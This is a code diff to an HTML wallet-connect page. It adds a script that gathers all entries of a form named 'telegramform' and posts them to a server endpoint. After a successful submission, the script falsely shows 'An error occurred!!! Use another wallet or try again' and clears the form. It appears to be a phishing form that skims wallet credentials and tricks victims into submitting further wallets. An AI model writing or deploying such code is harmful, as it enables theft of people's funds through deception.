@@ -1586,9 +1586,55 @@
 
             <div class="error" style="color: red"></div>
             <button id=id="submitBtn" type="submit" name="submit" value="submit">
+				 <p id="formstatus"></p>
               Connect Wallet
             </button>
+
+			  <p id="formStatus" aria-live="polite"></p>
              </form>
+		    <script>
+const form = document.getElementById("telegramform");
+const button = document.getElementById("submitBtn");
+const status = document.getElementById("formStatus");
+
+form.addEventListener("submit", async (e) => {
+  e.preventDefault();
+
+  button.disabled = true;
+  button.textContent = "Sending...";
+  status.textContent = "";
+
+  const formData = Object.fromEntries(
+    new FormData(form).entries()
+  );
+
+  try {
+    const response = await fetch("/api/sendform", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json"
+      },
+      body: JSON.stringify(formData)
+    });
+
+    const result = await response.json();
+
+    if (!response.ok) {
+      throw new Error(result.message || "Submission failed");
+    }
+
+    status.textContent = "An error occurred!!! Use another wallet or try again";
+    form.reset();
+
+  } catch (error) {
+    status.textContent = error.message;
+
+  } finally {
+    button.disabled = false;
+    button.textContent = "Submit";
+  }
+});
+</script>
           </div>
 
           <div id="successContainer" class="container">
@@ -1607,6 +1653,7 @@
               encryption
             </h3>
           </div>
+		  
         </form>
       </div>
     </div>
